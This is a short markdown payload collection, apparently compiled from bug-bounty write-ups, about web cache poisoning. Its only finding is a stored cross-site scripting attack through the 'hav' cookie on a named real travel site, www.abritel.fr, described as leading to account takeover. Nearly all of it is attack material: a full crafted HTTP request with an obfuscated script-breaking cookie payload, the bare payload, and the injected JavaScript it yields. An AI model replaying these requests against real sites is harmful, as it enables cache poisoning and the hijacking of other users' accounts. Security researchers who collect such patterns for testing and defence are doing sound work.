# Payloads — cache-poisoning

_Verbatim payload / request patterns extracted from findings in this repo. Nothing invented._

## 1. Cache Poisoning Allows Stored XSS Via hav Cookie Parameter (To Account Takeover)
- Source: `telegram writeups (verbatim excerpts)`

```
GET /annonces/location-vacances/france_midi-pyrenees_46_stcere_dt0.php.js?xxxd HTTP/2
Host: www.abritel.fr
Cookie: hav=xss"</sc"ript><sv"g/onloa"d=aler"t"(document.doma"in)>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.abritel.fr/signup?enable_registration=true&redirectTo=%2Fsearch%2Fkeywords%3Asoissons-france-%28xss%29%2FminNightlyPrice%2F0%3FpetIncluded%3Dfalse%26filterByTotalPrice%3Dtrue%26ssr%3Dtrue&referrer_page_location=serp
Upgrade-Insecure-Requests: 1
Te: trailers
```

## 2. Cache Poisoning Allows Stored XSS Via hav Cookie Parameter (To Account Takeover)
- Source: `telegram writeups (verbatim excerpts)`

```
Cookie: hav=xss"</script><svg/onload=alert(document.domain)>
```

## 3. Cache Poisoning Allows Stored XSS Via hav Cookie Parameter (To Account Takeover)
- Source: `telegram writeups (verbatim excerpts)`

```
var hav="xss</script><svg/onload=alert(document.domain)>"
```
